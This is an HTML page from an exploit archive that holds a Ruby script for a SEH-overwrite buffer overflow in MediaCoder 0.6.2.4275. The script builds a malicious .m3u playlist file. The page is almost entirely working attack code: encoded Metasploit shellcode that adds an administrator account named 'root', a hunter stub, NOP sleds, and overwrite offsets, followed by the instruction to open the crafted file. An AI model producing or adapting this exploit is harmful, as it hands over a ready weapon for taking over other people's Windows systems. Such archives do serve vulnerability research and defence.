<html><head><title>MediaCoder 0.6.2.4275 Universal Buffer Overflow Exploit (SEH)</title></head><pre>#!/usr/bin/env ruby
# MediaCoder 0.6.2.4275 Universal Buffer Overflow Exploit (SEH)
# Universal SEH Overwrite Exploit
# By Stack
# Mountassif Moad
# Download app : http://mediacoder.sourceforge.net/mirrors.htm?file=MediaCoder-0.6.2.4275.exe
# cat Greatz.txt
# Jadi-Chel7 &amp; Mr.Safa7 &amp; Houssamix &amp; Simo-Soft &amp; DDos &amp; Simo64 &amp; G0rillaz &amp; Issam &amp; Sec-Alert &amp; &amp; Bohayra &amp; j0rd4n14n.r1z
# Webug &amp; Travis-Barker &amp; Keyo &amp; General l0s3r &amp; NeoCoderz &amp; welahima b9ite 3arefe chkoune akhore rani tansa :d
# ahe nsite big thnx to Str0ke and thanks you for all patience and your advice &amp; support
time3 = Time.new
puts &quot;Exploit Started in Current Time :&quot; + time3.inspect
puts &quot;Enter Name For your File Like : Stack&quot;
files = gets.chomp.capitalize
puts &quot;Name Of File : &quot; + files +'.m3u'
time1 = Time.new
$VERBOSE=nil
Header = 
&quot;\x23\x45\x58\x54\x4D\x33\x55\x0D\x0A\x23\x45\x58\x54\x49\x4E\x46&quot;+
&quot;\x3A\x33\x3A\x35\x30\x2C\x4C\x61\x6D\x62\x20\x4F\x66\x20\x47\x6F&quot;+
&quot;\x64\x20\x2D\x20\x53\x65\x74\x20\x54\x6F\x20\x46\x61\x69\x6C\x20&quot;+
&quot;\x0D\x0A\x44\x3A\x5C&quot;
# win32_adduser -  PASS=toor EXITFUNC=seh USER=root Size=489 Encoder=PexAlphaNum http://metasploit.com
Shellscode =
&quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot;+
&quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot;+
&quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot;+
&quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot;+
&quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54&quot;+
&quot;\x42\x50\x42\x30\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x38\x4e\x47&quot;+
&quot;\x45\x30\x4a\x57\x41\x50\x4f\x4e\x4b\x58\x4f\x54\x4a\x31\x4b\x48&quot;+
&quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x54\x4b\x58\x46\x53\x4b\x58&quot;+
&quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c&quot;+
&quot;\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e&quot;+
&quot;\x46\x4f\x4b\x33\x46\x45\x46\x42\x46\x50\x45\x57\x45\x4e\x4b\x48&quot;+
&quot;\x4f\x55\x46\x42\x41\x30\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x34&quot;+
&quot;\x4b\x48\x4f\x35\x4e\x31\x41\x30\x4b\x4e\x4b\x48\x4e\x41\x4b\x58&quot;+
&quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x53&quot;+
&quot;\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x53\x45\x38\x42\x4c\x4a\x57&quot;+
&quot;\x4e\x50\x4b\x38\x42\x54\x4e\x50\x4b\x58\x42\x57\x4e\x41\x4d\x4a&quot;+
&quot;\x4b\x38\x4a\x56\x4a\x30\x4b\x4e\x49\x30\x4b\x48\x42\x58\x42\x4b&quot;+
&quot;\x42\x50\x42\x30\x42\x50\x4b\x48\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot;+
&quot;\x48\x4f\x42\x46\x48\x55\x49\x48\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot;+
&quot;\x42\x55\x4a\x56\x42\x4f\x4c\x58\x46\x50\x4f\x45\x4a\x36\x4a\x39&quot;+
&quot;\x50\x4f\x4c\x58\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x46\x4d\x46&quot;+
&quot;\x46\x56\x50\x52\x45\x36\x4a\x47\x45\x46\x42\x52\x4f\x32\x43\x46&quot;+
&quot;\x42\x52\x50\x56\x45\x56\x46\x37\x42\x52\x45\x57\x43\x57\x45\x46&quot;+
&quot;\x44\x37\x42\x32\x44\x47\x4f\x46\x4f\x56\x46\x37\x42\x32\x46\x37&quot;+
&quot;\x4f\x36\x4f\x56\x44\x57\x42\x52\x4f\x42\x41\x44\x46\x54\x46\x34&quot;+
&quot;\x42\x52\x48\x52\x48\x52\x42\x32\x50\x56\x45\x36\x46\x37\x42\x52&quot;+
&quot;\x4e\x36\x4f\x46\x43\x56\x41\x56\x4e\x36\x47\x36\x44\x57\x4f\x36&quot;+
&quot;\x45\x57\x42\x47\x42\x52\x41\x34\x46\x46\x4d\x36\x49\x46\x50\x56&quot;+
&quot;\x49\x36\x43\x47\x46\x47\x44\x37\x41\x36\x46\x57\x4f\x56\x44\x57&quot;+
&quot;\x43\x47\x42\x32\x44\x57\x4f\x56\x4f\x46\x46\x47\x42\x32\x4f\x32&quot;+
&quot;\x41\x54\x46\x54\x46\x54\x42\x50\x5a&quot;
# Media_bruteforcer_shellcode
Bruteforce = # BruteForce the shellcode to runing if it dont work in the first methode
&quot;\xD0\x62\x43&quot;+        #  SHL BYTE PTR DS:[EDX+43],1
&quot;\x00\xB8\x6D&quot;+        #  ADD BYTE PTR DS:[EAX+1ABBB6D],BH
&quot;\xBB\xAB\x01&quot;+
&quot;\x00\x00&quot;+            #  ADD BYTE PTR DS:[EAX],AL
&quot;\x00\xF0&quot;+            #  ADD AL,DH
&quot;\xFF\x13&quot;+            #  CALL DWORD PTR DS:[EBX]
&quot;\x00\x4F\x6D&quot;+        #  ADD BYTE PTR DS:[EDI+6D],CL
&quot;\x81\x7C\x38\x07&quot;+    #  CMP DWORD PTR DS:[EAX+EDI+7],FFFF7C92
&quot;\x92\x7C\xFF&quot;+
&quot;\xFF\xFF&quot; + Shellscode
Rhunter =
&quot;\x5B&quot;+             #POP EBX
&quot;\x90&quot; * 10 +       # NOP x 10  
&quot;\x90\x90&quot;+         # NOP NOP
&quot;\x8D\x44\xC1\x04&quot;+ # LEA EAX,DWORD PTR DS:[ECX+EAX*8+4]
&quot;\x8B\x1E&quot;+         # MOV EBX,DWORD PTR DS:[ESI]
&quot;\x89\x18&quot;+         # MOV DWORD PTR DS:[EAX],EBX
&quot;\x89\x06&quot;+         # MOV DWORD PTR DS:[ESI],EAX
&quot;\x42&quot;+             # INC EDX
&quot;\x83\xFA\x64&quot;+     # CMP EDX,64
&quot;\x75\xEC&quot;+         # JNZ SHORT dsp_chmx.0169127E
&quot;\x8B\x06&quot;+         # MOV EAX,DWORD PTR DS:[ESI]
&quot;\x8B\x10&quot;+         # MOV EDX,DWORD PTR DS:[EAX]
&quot;\x89\x16&quot;+         # MOV DWORD PTR DS:[ESI],EDX
&quot;\x5E&quot;+             # POP ESI
&quot;\x5B&quot;+             # POP EBX
&quot;\x93\x43&quot;+         # CALL ESP
&quot;\x92\x7c&quot;
Over     = &quot;\x41&quot; * 195 + &quot;\xff\xff\xff\xff&quot; + &quot;\x47&quot; * 4 + &quot;\x42&quot; * 6 + &quot;\xff\xff\x47\x47\x47\xFF\x65\x78\x77\x76&quot;
Nop      = &quot;\x90&quot; * 8
Next_Seh = &quot;\xeb\x06\xff\xff&quot;
Seh      = &quot;\x93\xB6\x98\x7C&quot; 
Nopsled  = &quot;\x90&quot; * 7
Xpl = Header + Over + Rhunter + Nop + Shellscode + Nopsled + Next_Seh + Seh + Nop + Bruteforce + Nopsled
File.open( files+&quot;.m3u&quot;, &quot;w&quot; ) do |the_file|
the_file.puts(Xpl)
puts &quot;Exploit finished in Current Time :&quot; + time1.inspect
puts &quot;Now Open &quot; + files +&quot;.m3u :d&quot;
end

# milw0rm.com [2009-03-09]</pre></html>